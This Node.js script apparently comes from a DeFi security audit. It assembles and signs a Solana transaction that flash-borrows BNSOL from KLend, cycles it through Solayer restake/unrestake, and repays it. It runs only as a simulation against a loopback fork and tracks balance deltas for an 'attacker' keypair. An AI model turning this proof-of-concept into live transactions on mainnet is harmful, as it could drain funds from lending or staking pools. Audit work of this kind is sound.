#!/usr/bin/env node
'use strict';

// Exact-zero-fee KLend BNSOL -> Solayer restake/unrestake -> KLend repay.
// Current mainnet accounts are loaded on demand by a loopback Surfpool fork.
// Only signed v1 simulateTransaction(sigVerify:true) is used; no send path.

const fs = require('fs');
const crypto = require('crypto');
const MOD = '/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules';
const {PublicKey, Keypair, TransactionInstruction, TransactionMessage, SystemProgram} = require(`${MOD}/@solana/web3.js`);
const {TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID, getAssociatedTokenAddressSync,
  createAssociatedTokenAccountIdempotentInstruction} = require(`${MOD}/@solana/spl-token`);
const bs58Module = require(`${MOD}/bs58`);
const bs58 = bs58Module.default || bs58Module;
const {encodeV1} = require('./klend-v1-composition.js');

const DIR = __dirname;
const OUT = `${DIR}/solayer-bnsol-klend-signed-v1.json`;
const RPC = process.env.SOLAYER_FORK_RPC || 'http://127.0.0.1:34999';
if (!/^http:\/\/127\.0\.0\.1:\d+$/.test(RPC)) throw new Error('loopback Surfpool required');
const P = value => new PublicKey(value);
const SOLAYER = P('sSo1iU21jBrU9VaJ8PJib1MtorefUV4fzC9GURa2KNn');
const KLEND = P('KLend2g3cP87fffoy8q1mQqGKjrxjC8boSyAYavgmjD');
const BNSOL = P('BNso1VUJnh4zcfpZa6986Ea66P6TCp59hvtNJ8b1X85');
const RST = P('bnsoLDvQ8EgtvU9SWdihfbPB7ynkeQQYTFoJERwycW7');
const POOL = P('7RJPqA2b4SicEzLSyUVhGZUdH2rGrTaXV1t7Z4ga2Kpg');
const VAULT = P('9Qj3UvSYbyDFotud3BQeFfrwqXcrKQ92MR3yjqpzA771');
const RESERVE = P('Fqjbo3L4NAyzPcy6swv1XXLm1c7tUTKWMDkjCo9mfSDq');
const MARKET = P('7u3HeHxYDLhnCoErrtycNokbQYbWGzLs6JSDqGAv5PfF');
const SUPPLY = P('DvB11zGUS4RxMGNNpLD9s93N4nuNsu6Yjhg1mhoLHjgw');
const FEE_VAULT = P('AWQoSNpBPF2zeD2p2QU8JMzqBNDDa4SJuqGP5ExNAVqJ');
const IX_SYSVAR = P('Sysvar1nstructions1111111111111111111111111');
const [MARKET_AUTHORITY] = PublicKey.findProgramAddressSync([Buffer.from('lma'), MARKET.toBuffer()], KLEND);
const attacker = Keypair.generate();
const attackerBnsol = getAssociatedTokenAddressSync(BNSOL, attacker.publicKey);
const attackerRst = getAssociatedTokenAddressSync(RST, attacker.publicKey);
const flashHistory = JSON.parse(fs.readFileSync(`${DIR}/kamino-flash-history.json`, 'utf8'));
const source = flashHistory.hits[0].transaction;
const key = (pubkey, isSigner = false, isWritable = false) => ({pubkey, isSigner, isWritable});
const disc = name => crypto.createHash('sha256').update(`global:${name}`).digest().subarray(0, 8);
const u64 = value => { const out = Buffer.alloc(8); out.writeBigUInt64LE(BigInt(value)); return out; };

let rpcId = 0;
async function rpc(method, params) {
  const response = await fetch(RPC, {method: 'POST', headers: {'content-type': 'application/json'},
    body: JSON.stringify({jsonrpc: '2.0', id: ++rpcId, method, params}), signal: AbortSignal.timeout(30_000)});
  const json = await response.json();
  if (json.error) throw new Error(`${method}: ${json.error.code} ${json.error.message}`);
  return json.result;
}

function historyIx(index) {
  const message = source.transaction.message;
  const staticKeys = message.accountKeys;
  const loadedWritable = source.meta.loadedAddresses?.writable || [];
  const loadedReadonly = source.meta.loadedAddresses?.readonly || [];
  const all = [...staticKeys, ...loadedWritable, ...loadedReadonly];
  const h = message.header;
  const writable = i => i < staticKeys.length
    ? (i < h.numRequiredSignatures ? i < h.numRequiredSignatures - h.numReadonlySignedAccounts
      : i < staticKeys.length - h.numReadonlyUnsignedAccounts)
    : i < staticKeys.length + loadedWritable.length;
  const raw = message.instructions[index];
  return new TransactionInstruction({programId: P(all[raw.programIdIndex]),
    keys: raw.accounts.map(i => key(P(all[i]), i < h.numRequiredSignatures, writable(i))),
    data: Buffer.from(bs58.decode(raw.data))});
}

const borrowTemplate = historyIx(3);
const repayTemplate = historyIx(13);
if (!borrowTemplate.programId.equals(KLEND) || !repayTemplate.programId.equals(KLEND)) throw new Error('KLend templates changed');

function flashIx(template, amount, borrowIndex) {
  const keys = template.keys.map(item => ({...item}));
  for (const [index, pubkey] of Object.entries({0: attacker.publicKey, 1: MARKET_AUTHORITY, 2: MARKET,
    3: RESERVE, 4: BNSOL, 5: SUPPLY, 6: attackerBnsol, 7: FEE_VAULT,
    8: KLEND, 9: KLEND, 10: IX_SYSVAR, 11: TOKEN_PROGRAM_ID})) keys[Number(index)].pubkey = pubkey;
  const data = Buffer.from(template.data);
  data.writeBigUInt64LE(amount, 8);
  if (borrowIndex !== undefined) data[16] = borrowIndex;
  return new TransactionInstruction({programId: KLEND, keys, data});
}

function solayerIx(name, amount) {
  return new TransactionInstruction({programId: SOLAYER, keys: [
    key(attacker.publicKey, true, true), key(BNSOL), key(attackerBnsol, false, true),
    key(attackerRst, false, true), key(RST, false, true), key(VAULT, false, true), key(POOL),
    key(ASSOCIATED_TOKEN_PROGRAM_ID), key(TOKEN_PROGRAM_ID), key(SystemProgram.programId),
  ], data: Buffer.concat([disc(name), u64(amount)])});
}

function signV1(instructions, blockhash) {
  const encoded = encodeV1(instructions, attacker.publicKey, blockhash);
  const compiled = new TransactionMessage({payerKey: attacker.publicKey, recentBlockhash: blockhash, instructions}).compileToV0Message();
  const signerOrder = compiled.staticAccountKeys.slice(0, encoded.requiredSignatures).map(String);
  if (signerOrder.length !== 1 || signerOrder[0] !== attacker.publicKey.toBase58()) throw new Error('uncontrolled signer');
  const wire = Buffer.from(encoded.wire);
  const message = wire.subarray(0, wire.length - 64);
  const privateKey = crypto.createPrivateKey({key: Buffer.concat([
    Buffer.from('302e020100300506032b657004220420', 'hex'), Buffer.from(attacker.secretKey.subarray(0, 32)),
  ]), format: 'der', type: 'pkcs8'});
  crypto.sign(null, message, privateKey).copy(wire, wire.length - 64);
  return {wire, encoded, signerOrder};
}

function rawAmount(account, address) {
  if (!account) return null;
  const data = Buffer.from(account.data[0], 'base64');
  if (address.equals(RST) && data.length >= 44) return data.readBigUInt64LE(36).toString();
  return data.length >= 72 ? data.readBigUInt64LE(64).toString() : null;
}

async function simulate(label, amount, cycles, blockhash) {
  const instructions = [createAssociatedTokenAccountIdempotentInstruction(attacker.publicKey,
    attackerBnsol, attacker.publicKey, BNSOL), flashIx(borrowTemplate, amount)];
  for (let i = 0; i < cycles; i++) instructions.push(solayerIx('restake', amount), solayerIx('unrestake', amount));
  instructions.push(flashIx(repayTemplate, amount, 1));
  const {wire, encoded, signerOrder} = signV1(instructions, blockhash);
  const watch = [attackerBnsol, attackerRst, SUPPLY, FEE_VAULT, VAULT, RST];
  const beforeRows = (await rpc('getMultipleAccounts', [watch.map(String),
    {encoding: 'base64', commitment: 'processed'}])).value;
  const simulation = await rpc('simulateTransaction', [wire.toString('base64'), {
    encoding: 'base64', sigVerify: true, replaceRecentBlockhash: false, commitment: 'processed',
    innerInstructions: true, accounts: {encoding: 'base64', addresses: watch.map(String)},
  }]);
  const before = Object.fromEntries(watch.map((address, i) => [address.toBase58(), rawAmount(beforeRows[i], address)]));
  const post = Object.fromEntries(watch.map((address, i) => [address.toBase58(), rawAmount(simulation.value.accounts?.[i], address)]));
  const deltas = Object.fromEntries(watch.map(address => {
    const key = address.toBase58();
    return [key, before[key] === null || post[key] === null ? null : (BigInt(post[key]) - BigInt(before[key])).toString()];
  }));
  return {label, amountRaw: amount.toString(), cycles, err: simulation.value.err,
    bytes: encoded.sizeBytes, accountKeys: encoded.addressCount, instructions: encoded.instructionCount,
    requiredSignatures: encoded.requiredSignatures, signerOrder,
    unitsConsumed: simulation.value.unitsConsumed,
    before, post, deltas,
    logs: simulation.value.logs};
}

async function main() {
  await rpc('requestAirdrop', [attacker.publicKey.toBase58(), 10_000_000_000]);
  const liveSupply = BigInt((await rpc('getTokenAccountBalance', [SUPPLY.toBase58(), {commitment: 'processed'}])).value.amount);
  const blockhash = (await rpc('getLatestBlockhash', [{commitment: 'processed'}])).value.blockhash;
  const amounts = [...new Set([1n, liveSupply].map(String))].map(BigInt);
  const results = [];
  for (const amount of amounts) {
    for (const cycles of amount === liveSupply ? [1, 4] : [1]) {
      const result = await simulate(`${amount === liveSupply ? 'live_supply_edge' : 'one_raw'}_${cycles}_cycle`, amount, cycles, blockhash);
      results.push(result);
      console.log(JSON.stringify({label: result.label, err: result.err, bytes: result.bytes,
        accountKeys: result.accountKeys, instructions: result.instructions,
        unitsConsumed: result.unitsConsumed, post: result.post, lastLogs: result.logs?.slice(-10)}));
    }
  }
  fs.writeFileSync(OUT, `${JSON.stringify({generatedAt: new Date().toISOString(), localForkRpc: RPC,
    currentBinarySha256: crypto.createHash('sha256').update(fs.readFileSync(`${DIR}/solayer-current.so`)).digest('hex'),
    signatureVerification: true, messageVersion: 1, maxBytes: 4096, maxAccountKeys: 64,
    liveSubmission: false, attacker: attacker.publicKey.toBase58(),
    lender: {program: KLEND.toBase58(), reserve: RESERVE.toBase58(), supplyVault: SUPPLY.toBase58(),
      feeVault: FEE_VAULT.toBase58(), observedSupplyRaw: liveSupply.toString(), configuredFlashFeeSf: '0'},
    solayer: {program: SOLAYER.toBase58(), pool: POOL.toBase58(), vault: VAULT.toBase58(),
      lstMint: BNSOL.toBase58(), receiptMint: RST.toBase58()}, results}, null, 2)}\n`);
  console.log(JSON.stringify({output: OUT}));
}

main().catch(error => { console.error(error.stack || error.message); process.exitCode = 1; });
